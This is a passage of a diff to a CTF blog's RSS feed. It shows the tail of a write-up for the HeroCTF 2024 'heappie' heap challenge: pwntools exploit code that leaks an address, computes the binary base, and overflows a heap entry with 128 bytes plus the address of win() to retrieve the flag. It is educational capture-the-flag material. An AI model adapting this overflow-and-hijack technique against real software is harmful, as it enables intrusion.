+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;play &#34;</span> <span style="color:#f92672">+</span> str(play_number) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; @ &#34;</span> <span style="color:#f92672">+</span> hex(play_address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>play_offset <span style="color:#f92672">=</span> play_offsets[play_number<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># calculate the elf&#39;s base address from it</span>
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> play_address <span style="color:#f92672">-</span> play_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;resolved elf @ &#34;</span> <span style="color:#f92672">+</span> hex(elf<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>win_address <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;win&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;win @ &#34;</span> <span style="color:#f92672">+</span> hex(win_address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># delete the first music</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># main payload</span>
+</span></span><span style="display:flex;"><span>make_music(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;rami&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malek&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span><span style="color:#f92672">+</span>p64(win_address))
+</span></span><span style="display:flex;"><span>make_music(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pwned&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;conflict&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lol&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># call win()</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success((<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;FLAG -&gt; &#34;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>)<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>I really enjoyed this challenge as a beginner in heap exploitation.</p>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#top">back to top</a></p>
+]]></content>
+        </item>
+        
+        <item>
             <title>🇫🇷 PwnMe 2023 - pwn/vip_at_libc</title>
             <link>/posts/2023/05/pwnme-2023-pwn/vip_at_libc/</link>
             <pubDate>Mon, 08 May 2023 00:00:00 +0000</pubDate>
